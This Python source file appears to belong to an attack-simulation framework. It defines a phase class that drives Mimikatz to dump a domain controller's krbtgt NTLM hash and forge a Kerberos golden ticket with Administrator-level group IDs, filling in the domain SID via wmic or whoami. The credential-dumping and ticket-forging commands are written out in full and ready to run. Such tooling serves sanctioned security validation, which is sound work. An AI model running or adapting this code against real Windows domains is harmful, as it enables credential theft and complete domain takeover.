import re
import logging
from tempfile import NamedTemporaryFile
import os
try:
  # noinspection PyUnresolvedReferences
  import aipythonlib
except Exception as e:
  logging.error('error importing aipythonlib: {0}'.format(e))
from ai_utils.phases.abstract_phase import AbstractPhaseClass
from ai_utils.scenarios.globals import PathUtils, FileUtils, StringUtils, NetworkUtils

class GenerateKerberosTicketPhaseClass(AbstractPhaseClass):
  TrackerId = "369"
  Subject = "Generate Kerberos Ticket"
  Description = "Generate kerberos ticket and store it in a file"

  SUPPORTED_TICKETS = ['golden']

  def __init__(self, isPhaseCritical, ticketType='golden', fqdn='', domainSid='', hash='', user='', id='', groups='',
               ticketFile=''):
    AbstractPhaseClass.__init__(self, isPhaseCritical)
    logging.info('Executing Generate Kerberos Ticket Phase...')
    self.TicketType = ticketType.lower()
    self.FQDN = self._SetupFQDN(fqdn)
    self.DomainSid = self._SetupDomainSid(domainSid)
    self.Hash = self._SetupHash(hash)
    self.User = self._SetupUser(user)
    self.Id = self._SetupId(id)
    self.Groups = self._SetupGroups(groups)
    self.TicketFile = self._SetupOutputFile(ticketFile)

  def Setup(self):
    if not PathUtils.FindFile("mimikatz.exe"):
      self.PhaseReporter.Error("mimikatz.exe not found in path")
      return False
    if StringUtils.IsEmptyOrNull(self.TicketFile) or not self.TicketType in self.SUPPORTED_TICKETS:
      return False
    self._checkIfCriticalFailureAndLogIt()
    return True

  def GetTicketFilename(self):
    return self.TicketFile

  def ManualCleanup(self):
    fileToRemove = '{0}'.format(self.TicketFile)
    success = FileUtils.DeleteFile(fileToRemove)
    if success:
      self.PhaseReporter.Info('Kerberos ticket was correctly removed: {0}'.format(fileToRemove))
    else:
      self.PhaseReporter.Warn('Kerberos ticket could not be deleted: {0}'.format(fileToRemove))
    return success

  def Run(self):
    phaseSuccessful = self._CheckRequiredParameters()
    if phaseSuccessful:
      phaseSuccessful = self._GenerateKerberosTicket()
    if phaseSuccessful:
      self.PhaseResult['ticket'] = self.TicketFile
      self.PhaseReporter.Info("Successfully generated a kerberos {0} ticket: {1}".format(self.TicketType, self.TicketFile))
      self.PhaseReporter.Report('A Kerberos Golden Ticket was created by retrieving the Domain Controller\'s "krbtgt" account NTLM hash using Mimikatz.')
      if FileUtils.FileExists(self.TicketFile):
        self.PhaseReporter.Info('After the execution of this phase, the Kerberos ticket has not been removed '
                                'from filesystem. If it still exists, you might want to manually remove it: '
                                '{0}'.format(self.TicketFile))
    else:
      self.PhaseReporter.Info("Failed to generate a kerberos {0} ticket".format(self.TicketType))
      self._checkIfCriticalFailureAndLogIt()
    return phaseSuccessful

  ##
  # Internal methods
  ##################

  def _MimikatzCommand(self):
    cmd = ''
    if self.TicketType == 'golden':
      cmd = '"kerberos::golden /domain:{0} /sid:{1} /rc4:{2} /user:{3} /id:{4} /groups:{5} /ticket:{6}"'.format(
            self.FQDN, self.DomainSid, self.Hash, self.User, self.Id, self.Groups, self.TicketFile)
    else:
      logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
                                                                                            self.SUPPORTED_TICKETS))
    return cmd

  def _GenerateKerberosTicket(self):
    self.PhaseReporter.Info('Generating Golden Ticket...')
    cmd1 = 'privilege::debug '
    cmd2 = self._MimikatzCommand()
    cmd3 = ' exit '
    if not cmd2:
      logging.error('Mimikatz command could not be built')
      return False
    cmd = cmd1 + cmd2 + cmd3
    timeout = 5000
    errorCode, exitCode, stdOut, stdError = aipythonlib.AiRunCommand("mimikatz", cmd, timeout)
    if errorCode != 0 or stdError != '':
      logging.warning('Kerberos ticket could not be created. Mimikatz failed. '
                      'Error Code: {0}, Error Message: {1}'.format(errorCode, stdError.strip()))
    return errorCode == 0 and self._CheckFileExistence()

  def _CheckRequiredParameters(self):
    if StringUtils.IsEmptyOrNull(self.FQDN):
      logging.error('FQDN parameter was empty and its value could not be retrieved.')
      return False
    if StringUtils.IsEmptyOrNull(self.DomainSid):
      logging.error('Sid parameter was empty and its value could not be retrieved.')
      return False
    if StringUtils.IsEmptyOrNull(self.Hash):
      logging.error('Hash parameter was empty and its value could not be retrieved.')
      return False
    if StringUtils.IsEmptyOrNull(self.User):
      logging.error('User parameter was empty and its value could not be retrieved.')
      return False
    if StringUtils.IsEmptyOrNull(self.Id):
      logging.error('User Id parameter was empty and its value could not be retrieved.')
      return False
    if StringUtils.IsEmptyOrNull(self.Groups):
      logging.error('Groups parameter was empty and its value could not be retrieved.')
      return False
    if StringUtils.IsEmptyOrNull(self.TicketFile):
      logging.error('Ticket file path parameter was empty and its value could not be retrieved.')
      return False
    return True

  def _SetupFQDN(self, fqdn):
    param = ''
    if self.TicketType == 'golden':
      param = str(fqdn) or NetworkUtils.GetMachineFQDN()
      self.PhaseReporter.Info('FQDN value used to build Kerberos ticket: {0}'.format(param))
    else:
      logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
                                                                                            self.SUPPORTED_TICKETS))
    return param

  def _SetupDomainSid(self, sid):
    param = ''
    if self.TicketType == 'golden':
      if sid:
        param = str(sid)
        logging.info("SID passed as parameter to build Kerberos ticket: {0}".format(param))
      else:
        correctSid = False
        username = PathUtils.GetUserEnvVar('USERNAME')  # this might return user$, when happens, this approach fails
        if username == '%USERNAME%':
          username = ''
        if not username:
          username = os.environ.get('USERNAME')
        if username:
          logging.info('Username value correctly retrieved from environment variable USERNAME: {0}'.format(username))
          logging.info('Proceeding to obtain Sid value executing WMIC executable using the retrieved username value.')
          timeout = 20000
          cmdparam = "useraccount where name='{0}' get sid".format(username)
          errorCode, exitCode, stdOut, stdError = aipythonlib.AiRunCommand('wmic', cmdparam, timeout)
          if errorCode == 0 and stdError == '' and exitCode == 0:
            sid = re.search("S-1.*", stdOut)
            if sid:
              sid = sid.group().strip()
              idx = sid.rfind('-')
              if idx != -1:
                param = sid[:idx]
                self.PhaseReporter.Info("Retrieved SID to build Kerberos ticket: {0}".format(param))
                correctSid = True
          else:
            logging.warning('WMIC execution was not successful. '
                            'Exit Code: {0}, Error Code: {1}, Error Message: {2}'.format(exitCode, errorCode,
                                                                                         stdError.strip()))
        if not correctSid:
          logging.info('Username could not be retrieved from USERNAME environment variable. '
                       'Using whoami /user approach to retrieve Sid...')
          timeout = 5000
          errorCode, exitCode, stdOut, stdError = aipythonlib.AiRunCommandAsActiveLoggedInUser('whoami', '/user', timeout)
          # Error: A required privilege is not held by the client. (mostly used when executed from pycharm for testing)
          if errorCode == 1314:
            errorCode, exitCode, stdOut, stdError = aipythonlib.AiRunCommand('whoami', '/user', timeout)
          if errorCode == 0 and stdError == '' and exitCode == 0:
            sid = re.search("S-1.*", stdOut)
            if sid:
              sid = sid.group().strip()
              idx = sid.rfind('-')
              if idx != -1:
                param = sid[:idx]
                self.PhaseReporter.Info("Retrieved SID to build Kerberos ticket: {0}".format(param))
          else:
            logging.warning('WHOAMI execution was not successful. '
                            'Exit Code: {0}, Error Code: {1}, Error Message: {2}'.format(exitCode, errorCode,
                                                                                         stdError.strip()))
    else:
      logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
                                                                                            self.SUPPORTED_TICKETS))
    if not param:
      logging.warning('Sid value to build Kerberos ticket could not be retrieved.')
    assert isinstance(param, type(''))
    return param

  def _SetupHash(self, hash):
    param = ''
    if self.TicketType == 'golden':
      if hash:
        param = str(hash)
        logging.info("Hash passed as parameter to build Kerberos ticket (redacted): {0}".format(param[:5]))
      else:
        # agent must have admin privileges to successfully execute 'privilege::debug'
        cmd = 'privilege::debug "lsadump::lsa /inject /name:krbtgt" exit'
        timeout = 5000
        errorCode, exitCode, stdOut, stdError = aipythonlib.AiRunCommand('mimikatz.exe', cmd, timeout)
        if errorCode == 0 and stdError == '' and exitCode == 0:
          hash = re.search("NTLM.*", stdOut)
          if hash:
            hash = hash.group()
            if hash.find(':') != -1 and len(hash.split(':')) > 1:
                param = hash.split(':')[1].strip()
                self.PhaseReporter.Info("Retrieved krbtgt NTLM hash to build Kerberos ticket (redacted): {0}".format(param[:5]))
            else:
              logging.error('Mimikatz output showing krbtgt hash was not the expected. Failed to parse output.')
          else:
            logging.warning('krbtgt hash not present in Mimikatz output')
        else:
          logging.warning('Mimikatz execution to retrieve krbtgt hash was not successful. '
                          'Exit Code: {0}, Error Code: {1}, Error Message: {2}'.format(exitCode, errorCode,
                                                                                       stdError.strip()))
    else:
      logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
                                                                                            self.SUPPORTED_TICKETS))
    if not param:
      logging.warning('Hash value to build Kerberos ticket could not be retrieved.')
    assert isinstance(param, type(''))
    return param

  def _SetupUser(self, user):
    param = ''
    if self.TicketType == 'golden':
      # for golden tickets, the user can be even a nonexistent one
      param = str(user) or 'Administrator'
      self.PhaseReporter.Info('Username value to build Kerberos ticket: {0}'.format(param))
    else:
      logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
                                                                                            self.SUPPORTED_TICKETS))
    if not param:
      logging.warning('User value to build Kerberos ticket could not be retrieved.')
    assert isinstance(param, type(''))
    return param

  def _SetupId(self, id):
    param = ''
    if self.TicketType == 'golden':
      param = str(id) or '500'  # administrator privs
      self.PhaseReporter.Info('User Id value to build Kerberos ticket: {0}'.format(param))
    else:
      logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
                                                                                            self.SUPPORTED_TICKETS))
    if not param:
      logging.warning('User Id value to build Kerberos ticket could not be retrieved.')
    assert isinstance(param, type(''))
    return param

  def _SetupGroups(self, groups):
    param = ''
    if self.TicketType == 'golden':
      param = str(groups) or '513,512,520,518,519'  # info about group ids http://support.microsoft.com/kb/243330
      self.PhaseReporter.Info('Groups value to build Kerberos ticket: {0}'.format(param))
    else:
      logging.error('Kerberos ticket type {0} not supported. Supported tickets: {1}'.format(self.TicketType,
                                                                                            self.SUPPORTED_TICKETS))
    if not param:
      logging.warning('Groups value to build Kerberos ticket could not be retrieved.')
    assert isinstance(param, type(''))
    return param

  def _SetupOutputFile(self, destFile):
    if destFile:
      param = str(destFile)
      logging.info("Ticket output file name passed as parameter to build Kerberos ticket: {0}".format(param))
    else:
      param = PathUtils.GetTempFile(prefixArg='ai_', suffixArg='.kirbi')
      logging.info('Ticket filename value to build Kerberos ticket: {0}'.format(param))
    if not param:
      logging.warning('Kerberos ticket output file name could not be set.')
    assert isinstance(param, type(''))
    return param

  def _CheckFileExistence(self):
    return FileUtils.FileExists(self.TicketFile) and FileUtils.GetFilesize(self.TicketFile) > 0

  def _checkIfCriticalFailureAndLogIt(self):
    criticalError = False
    if not self.FQDN:
      self.PhaseReporter.Info('Most probably the phase failed because asset machine is not inside '
                              'a Windows Domain. FQDN could not be retrieved.')
      criticalError = True
    if criticalError:
      self._ShowRequirements()
    return criticalError

  def _isDCMachineNameCorrect(self, machineName):
    return machineName and machineName != '.' + self.FQDN

  def _ShowRequirements(self):
    self.PhaseReporter.Info("")
    self.PhaseReporter.Info("For this phase to succeed with the default parameters, these requirements should be satisfied:")
    self.PhaseReporter.Info("  1. The asset machine should be inside a windows domain.")
    self.PhaseReporter.Info("  2. The asset machine should have the krbtgt account credentials cached.")
    self.PhaseReporter.Info("  3. The asset machine should have a user session opened (a user should be logged in while the scenario is executed)")
